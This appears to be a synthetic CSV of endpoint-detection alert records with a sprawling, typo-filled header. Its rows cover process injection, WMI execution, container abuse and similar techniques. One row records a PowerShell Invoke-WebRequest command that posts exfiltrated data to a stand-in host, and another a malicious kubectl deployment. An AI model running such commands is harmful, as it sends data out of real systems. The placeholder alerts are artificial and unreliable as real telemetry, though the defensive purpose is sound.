AlertID,AlertTimestamp,MachineId,ComputerName,Severity,AlertName,AlertType,Category,AlertDescription,Status,ExtendedProperties,event_id,event_type,event_timestamp,event_category,severity,detect_description,detect_id,technique,device_name,file_name,file_size,src_path,dst_path,user_name,process_name,AlertSeverity,Recommendation,RuleName,Source,Tactic,Technique,AlertCategory,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,DetectionId,event_description,Details,EndpointID,EndpointName,ParentProcessName,ParentProcessPath,ProcessPath,host,user,process,network,detection,FallbackProtocol,DestinationIP,DestinationPort,artifact_hiding,security_control_disablement,Event,Host,User,Action,Reason,event_time,alert_rule_name,technique_name,tactic,process_id,command_line,destination_ip,destination_port,source_ip,source_port,ProcessId,DestinationIp,SourceIp,SourcePort,AlertTimestamps,file_path,file_hash,process_hash,parent_process_name,parent_process_hash,registry_modification,subtype,recommendation,detection_details,product,mitre,endpoint,attack_details,event_severity,protocol,process_command_line,parent_process_command_line,parent_process_id,SourceIP,Protocol,ProcessCommandLine,ParentProcessCommandLine,event_categfory,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,alert_severity,action_taken,detection_source,ProcessHash,ProcessParentName,ProcessParentPath,ProcessParentHash,tactics,affected_entities,recommendations,source,destination,threat_severity,threat_category,threat_name,indicators,ioc,description,Description,Endpoint,DetectionSource,AlertyDescription,MACAddress,EventLogName,EventLogMessage,AdditionalInfo,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,DetectionMethod,RecommendedActions,event_catefory,affected_hosts,event_details,event_name,alert_type,event,Field,Operator,Value,Tags,RegistryKey,RegistryValue,type,timestamp,Title,Affected_Image_Path,Timestamp,Injected_Process_Name,Loader_Process_Name,Loader_Technique,event_Source,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,EntityName,EntityType,Hostname,event_version,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,detection_method,AlertNmae,IP,OS,category,action,event_data,data,ArtifactType,ArtifactPath,ArtifactName,sensor_id,customer_id,event_info,AffectedHostname,AffectedFile_Path,AlertSource,Parent_Process_Name,Injection_Technique,technique_id,subtechnique_id,subtechnique,additional_info,vendor,path,domain,ip_address,Name,event_subtype,src_ip,dst_ip,container_name,image_name,image_digest,registry,command,process_path,username,actor,host_info,event_url,event_hash,event_action,event_source,OperatingSystem,web_server_url,web_server_method,AssignedTo,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DomainName,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,OSVersion,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName,trigger,remediation,metadata,process_injection,ControlName,file_write,actions,alert_data,tags,Type,Condition,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,Affected_Device,Affected_User,Malicious_Executable,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,rule_name,hostname,ip,process_pid,files,MachineName,sha1_hash,local_ip,public_ip,malware_family,org_id,event_event_name,kill_chain_phases,data_source,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,parent_process_pid,c2,native_function_calls,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,TimestampUtc,SHA256,WebServiceName,WebServicePath,file,parent_process,os,pid,access_type,operation,InjectedProcessName,InjectionTechnique,AleertDescription,AlertDetails,mitre_technique,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentID,Detection_Details,Process_Path,Process_Command_Line,AffectedImagePath,machine_id,user_id,alert_name,remote_address,remote_port,local_address,local_port,AlertId,RemoteServer,ParentCommandLine,EventID,Hash,ParentHash,ExecutionStatus,event_cagtegory,remediation_steps,AffectedHostInfo,DetectionDetails,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,Path,HostIP,KillChain,EndpointDetails,detected_by,details,device,TargetUser,OriginalPermissions,NewPermissions,cloud_infrastructure_modification,CloudProvider,APIOperation,evebnt_category,EntityValue,creationTimeUtc,status,recommendedActions,vendorInformation,properties,src_port,remote_ip,Target,Port,AffectedEndpoints,IndicatorsOfCompromise,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,file_permission_modification,Product,AttackType,AttackDuration,AffectedServices,EventTime,application,threat,affected_host,alert_category,alert_recommendation,alert_details,References,target,attack_name,affected_process,affected_file_path,recommended_actions,host_name,md5_hash,sha256_hash,AlertTimestampUtc,EventId,WebServerUrl,WebServerMethod,process_execution,event_ category,detect_name,rule_description,triggered_rule,remote_server,CloudAccount,endpoint_id,web_service_name,web_service_path,ProcessParentCommandLine,AttackVector,alert_rule_id,alert_state,alert_time,src,process_tree,ioc_type,ioc_value,process_details,host_details,file_info,network_info,email_sender,email_recipient,email_subject,email_urls,email_attachments,ip_addresses,mac_addresses,operating_system,agent_version,group_name,Vendor,Username,name,event_creator,mitre_attack_id,cloud_account,detection_info,URL,file_deletion,AttackTactic,AttackTechnique,EntityId,EntityIp,MachineDomainName,AlertLink,AlertTime,UserInfo,PhishingInfo,DetectionID,EventHash,AffectedEntities,KillChainPhase,RemediationSteps,Alertescription,modified_time,original_hash,current_hash,event)category,combined_data
0304054d,2023-03-10T10:30:00Z,,,High,Obfuscated Files,,,Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter.,,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.,,,Defense Evasion,Obfuscated Files or Information,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,C:\Program Files\Malware\malware.exe,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 0304054d. AlertTimestamp is 2023-03-10T10:30:00Z. Severity is High. AlertName is Obfuscated Files. AlertDescription is Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter.. Recommendation is Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.. Tactic is Defense Evasion. Technique is Obfuscated Files or Information. AffectedHostname is hostname123. AffectedFile_Path is C:\Program Files\Malware\malware.exe. AlertSource is Defender for Endpoint EDR. 
,,,,High,,,,,,,12345,alert,2023-03-10T13:30:00Z,Process Injection,,,,,,,,,,,,,Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.,,,,,,,,,,,,,,,,,A suspicious process injection has been detected.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,notepad.exe,Thread Execution Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Severity is High. event_id is 12345. event_type is alert. event_timestamp is 2023-03-10T13:30:00Z. event_category is Process Injection. Recommendation is Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.. event_description is A suspicious process injection has been detected.. Affected_Hostname is hostname123. Alert_Source is CrowdStrike Falcon. Injected_Process_Name is explorer.exe. Parent_Process_Name is notepad.exe. Injection_Technique is Thread Execution Hijacking. 
,,,,,,,,,,,ABC123-1234-5678-9101-23456789,threat_detection,2022-03-07T14:23:54.123Z,resource hijacking,,,,Resource Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,An attempt to hijack system resources has been detected on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,,,Resource Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,critical,,,,,,,,,,,,,,,,,,,,,,"[{'type': 'host', 'id': '123456', 'name': 'DESKTOP-1234', 'ip_addresses': ['192.168.1.100'], 'os_type': 'Windows'}]",,,,,,,,,A suspicious process is attempting to hijack system resources on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1496,,,"{'process_name': 'explorer.exe', 'target_resource': 'memory', 'operation': 'write', 'suspicious_action': 'attempt to overwrite critical memory region'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is ABC123-1234-5678-9101-23456789. event_type is threat_detection. event_timestamp is 2022-03-07T14:23:54.123Z. event_category is resource hijacking. technique is Resource Hijacking. event_description is An attempt to hijack system resources has been detected on the endpoint.. tactic is Resource Hijacking. event_severity is critical. description is A suspicious process is attempting to hijack system resources on the endpoint.. technique_id is T1496. additional_info process_name is explorer.exe. additional_info target_resource is memory. additional_info operation is write. additional_info suspicious_action is attempt to overwrite critical memory region. 
12345,2023-03-10T15:30:00Z,,,High,System Shutdown,ProcessCreate,Malicious Activity,A system shutdown or reboot has been initiated.,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-1234,,cmd.exe,shutdown /r /t 0,,,192.168.1.100,user1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 12345. AlertTimestamp is 2023-03-10T15:30:00Z. Severity is High. AlertName is System Shutdown. AlertType is ProcessCreate. Category is Malicious Activity. AlertDescription is A system shutdown or reboot has been initiated.. HostName is DESKTOP-1234. ProcessName is cmd.exe. CommandLine is shutdown /r /t 0. IPAddress is 192.168.1.100. UserName is user1. 
,,,,,,,,,,,EDR-13579,Malware,,trojan,Critical,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Trojanized SSH client detected on host LAPTOP-XYZ,,,,,,,,,,,,,,,,,,,,,,2022-10-31T01:23:45Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'host_name': 'LAPTOP-XYZ', 'ip_address': '192.168.1.50'}]","{'username': 'jdoe', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.51', 'destination_ip': '192.168.1.50', 'malware_name': 'Trojanized SSH Client', 'malware_type': 'Trojan', 'malware_action': 'Execution'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is EDR-13579. event_type is Malware. event_category is trojan. severity is Critical. event_description is Trojanized SSH client detected on host LAPTOP-XYZ. event_time is 2022-10-31T01:23:45Z. event_details username is jdoe. event_details domain is MYDOMAIN. event_details source_ip is 192.168.1.51. event_details destination_ip is 192.168.1.50. event_details malware_name is Trojanized SSH Client. event_details malware_type is Trojan. event_details malware_action is Execution. 
123456,2023-03-10T15:30:00Z,,,,Windows Management Instrumentation Execution,,,"This alert is triggered when Windows Management Instrumentation (WMI) is used to execute commands or scripts on a system, which is a technique used by attackers to bypass traditional security controls.",,,,,,,High,,,,,,,,,,,,,,,,,,,,wmiprvse.exe,,,,,JohnDoe,,,,,,,,,,,PC12345,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows Management Instrumentation Execution,,,,,,,,,,,,,,,,,,,Defender,C:\Windows\System32\wbem\wmiprvse.exe,DOMAIN,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 123456. AlertTimestamp is 2023-03-10T15:30:00Z. AlertName is Windows Management Instrumentation Execution. AlertDescription is This alert is triggered when Windows Management Instrumentation (WMI) is used to execute commands or scripts on a system, which is a technique used by attackers to bypass traditional security controls.. severity is High. ProcessName is wmiprvse.exe. UserName is JohnDoe. host is PC12345. type is endpoint. category is Windows Management Instrumentation Execution. vendor is Defender. path is C:\Windows\System32\wbem\wmiprvse.exe. domain is DOMAIN. ip_address is 192.168.1.100. "
EDR-T1609,,,,High,Container Administration Command Execution Detected,,,"In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'StartTime': '2022-03-15T14:30:00Z', 'EndTime': '2022-03-15T14:31:00Z', 'Source': {'HostName': 'Endpoint-001', 'IPAddress': '192.168.1.100'}, 'Destination': {'HostName': 'Container-001', 'IPAddress': '192.168.1.200'}, 'EventType': 'CommandExecution', 'Command': 'docker exec -it <container_id> /bin/bash'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Container Administration Command,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is EDR-T1609. Severity is High. AlertName is Container Administration Command Execution Detected. AlertDescription is In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container.. Event StartTime is 2022-03-15T14:30:00Z. Event EndTime is 2022-03-15T14:31:00Z. Event EventType is CommandExecution. Event Command is docker exec -it <container_id> /bin/bash. Name is Container Administration Command. "
,,,,,,,,,,,123456789,threat detection,2022-03-07T12:30:00Z,Behavior,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Data transfer size limits were exceeded on endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,high,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'Endpoint', 'entity_name': 'Endpoint001', 'os': 'Windows 10', 'username': 'User001'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Data Transfer Size Limits Detected,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 123456789. event_type is threat detection. event_timestamp is 2022-03-07T12:30:00Z. event_category is Behavior. event_description is Data transfer size limits were exceeded on endpoint. event_severity is high. event_subtype is Data Transfer Size Limits Detected. src_ip is 192.168.1.100. 
,,,,,,,,,,,1234567890,Detect,2022-04-01T13:15:30Z,suspicous container,High,,,,,,,,,,kubectl.exe,,,,,,,,,,,,,,,,,,,Suspicious container deployment detected,,,,,,,,,,,"{'detection_id': 'Detection-123', 'detection_time': '2022-04-01T13:18:30Z', 'detection_category': 'Exploit', 'detection_name': 'Container Deployment', 'detection_description': 'Detection of a container deployment using an exploit'}",,,,,,,,,,,,,,,,,10.10.10.10,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ContainerDeploy,,,malicious-container,malicious-image,sha256:abcdef123456,malicious-registry.com,kubectl run malicious-container --image=malicious-image,C:\Windows\System32\kubectl.exe,admin,"{'type': 'Unknown', 'name': 'Unknown'}","{'hostname': 'computer-123', 'os_version': 'Windows 10 Pro 21H1', 'os_type': 'Windows', 'ip_addresses': ['192.168.1.100', 'fe80::d5a3:9c9f:2189:e591'], 'mac_addresses': ['00:0c:29:aa:bb:cc'], 'domain': 'mycompany.local'}",https://falcon.crowdstrike.com/sensors/entities/incidents/incident-details?incidentId=1234567890,abc123def456ghi789jkl012mno345pqr678stu9v,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 1234567890. event_type is Detect. event_timestamp is 2022-04-01T13:15:30Z. event_category is suspicous container. severity is High. process_name is kubectl.exe. event_description is Suspicious container deployment detected. detection detection_id is Detection-123. detection detection_time is 2022-04-01T13:18:30Z. detection detection_category is Exploit. detection detection_name is Container Deployment. detection detection_description is Detection of a container deployment using an exploit. destination_ip is 10.10.10.10. source_ip is 192.168.1.100. event_subtype is ContainerDeploy. container_name is malicious-container. image_name is malicious-image. image_digest is sha256:abcdef123456. registry is malicious-registry.com. command is kubectl run malicious-container --image=malicious-image. process_path is C:\Windows\System32\kubectl.exe. username is admin. actor type is Unknown. actor name is Unknown. host_info hostname is computer-123. host_info os_version is Windows 10 Pro 21H1. host_info os_type is Windows. host_info domain is mycompany.local. event_url is https://falcon.crowdstrike.com/sensors/entities/incidents/incident-details?incidentId=1234567890. event_hash is abc123def456ghi789jkl012mno345pqr678stu9v. 
,,,,,,,,,,,nfkskfjs,threat_detection,1646947200,policy_modification,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,A domain policy was modified on the endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'example-host', 'ip_address': '192.168.1.1', 'operating_system': 'Windows 10'}",,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'affected_entities': [{'entity_type': 'domain_policy', 'entity_name': 'example-policy'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,detect,endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is nfkskfjs. event_type is threat_detection. event_timestamp is 1646947200. event_category is policy_modification. event_description is A domain policy was modified on the endpoint. endpoint hostname is example-host. endpoint ip_address is 192.168.1.1. endpoint operating_system is Windows 10. event_severity is high. event_action is detect. event_source is endpoint. 
lkkkkjl0,2023-03-10T12:00:00Z,,,High,Endpoint Detection and Response,,,Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments,,,,,,,,,,,,,,,,,,,,,,,Domain Policy Modification,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,example-policy,Domain Policy,example-host,,,,,,,,,,192.168.1.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is lkkkkjl0. AlertTimestamp is 2023-03-10T12:00:00Z. Severity is High. AlertName is Endpoint Detection and Response. AlertDescription is Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Technique is Domain Policy Modification. EntityName is example-policy. EntityType is Domain Policy. Hostname is example-host. IP is 192.168.1.1. OperatingSystem is Windows 10. 
,,,,,,,,,,,12345678-1234-1234-1234-123456789012,threat detection,2023-03-08T14:30:00Z,exfiltration over web service,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,Exfiltration Over Web Service Detected,,,,,,,,,,,,,,,,,,,,,,,,,,5678.0,powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data,,,,,,,,,,,,,,,,,,,,,,,high,,,,,,,,,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,http://exfiltration-server.com,POST,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345678-1234-1234-1234-123456789012. event_type is threat detection. event_timestamp is 2023-03-08T14:30:00Z. event_category is exfiltration over web service. process_name is explorer.exe. event_description is Exfiltration Over Web Service Detected. command_line is powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data. event_severity is high. detection_source is Microsoft Defender for Endpoint. web_server_url is http://exfiltration-server.com. web_server_method is POST. 
